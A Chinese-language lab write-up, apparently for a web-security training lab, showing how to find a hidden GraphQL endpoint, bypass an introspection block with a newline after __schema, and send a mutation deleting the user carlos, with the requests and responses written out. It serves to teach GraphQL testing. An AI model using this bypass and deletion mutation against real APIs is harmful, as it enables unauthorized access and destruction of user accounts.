# 实验室：寻找隐藏的 GraphQL 端点

本实验室的用户管理功能由一个隐藏的 GraphQL 端点提供支持。仅通过点击页面无法找到该端点，并且该端点还对自省（introspection）设置了防御措施。

要解决本实验，请找到隐藏的端点并删除用户 `carlos`。

详细了解 [在 Burp Suite 中使用 GraphQL](/burp/documentation/desktop/testing-workflow/working-with-graphql)。

## 步骤

侦察
- 使用各种可见功能，并未发现 GQL 端点

探测
- 对可能的端点发送通用查询
    - 可能的端点
        ```
        /graphql
        /api
        /api/graphql
        /graphql/api
        /graphql/graphql
        ```

    - 通用查询
        `query{__typename}`

- 在攻击器中使用通用查询暴破可能的端点
    ```http
    POST §§ HTTP/2
    Host: id.web-security-academy.net
    Content-Type: application/json

    {
        "query": "query{__typename}"
    }
    ```
    - 其中
        ```http
        POST /api HTTP/2
        ```
        - 响应
            ```http
            HTTP/2 405 Method Not Allowed
            Allow: GET
            Content-Type: application/json; charset=utf-8
            X-Frame-Options: SAMEORIGIN
            Content-Length: 20

            "Method Not Allowed"
            ```
        - 发现端点，但方法不允许

- 在兴趣端点调整方法后再次测试

    ```http
    GET /api HTTP/2
    Host: id.web-security-academy.net
    Content-Type: application/json

    {
        "query": "query{__typename}"
    }
    ```
    - 响应
        ```json
        {
            "data": {
                "__typename": "query"
            }
        }
        ```
    - 发现 GQL 端点 `/api`，并找到可用查询方法 fat `GET`

- 探测 GQL 自省

    ```json
    {
        "query": "{__schema{queryType{name}}}"
    }
    ```

    - 响应
        ```json
        {
            "errors": [{
                "locations": [],
                "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
            }]
        }
        ```
    - 应用程序阻止自省查询

- 尝试混淆自省字符串
    ```json
    {
        "query": "{__schema\n{queryType{name}}}"
    }
    ```

    ```graphql
    {__schema
    {queryType{name}}}
    ```

    - 使用空白符，此处为换行
    - 响应
        ```json
        {
            "data": {
                "__schema": {
                    "queryType": {
                        "name": "query"
                    }
                }
            }
        }
        ```

    - 成功使用自省功能

- 基于结构构造用户查询
    ```graphql
    query {
        getUser(id:3){
            id,
            username
        }
    }
    ```

    - 响应
        ```json
        {
            "data": {
                "getUser": {
                    "id": 3,
                    "username": "carlos"
                }
            }
        }
        ```
    - 确认目标用户 `id:3`

- 基于结构构造删除查询
    ```graphql
    # 传递变量并定义变量类型
    mutation($input: DeleteOrganizationUserInput) {
        # 使用删除功能并传递变量
        deleteOrganizationUser(input: $input) {
            # 回显对象为 user -> User，查看 id 与用户名
            user {
                id,
                username
            }
        }
    }

    {
        "input": {
            "id": 3
        }
    }
    ```

    - 响应
        ```json
        {
            "data": {
                "deleteOrganizationUser": {
                    "user": {
                        "id": 3,
                        "username": "carlos"
                    }
                }
            }
        }
        ```

示例解决方案
- 使用 URL 查询字符串而不是 fat GET
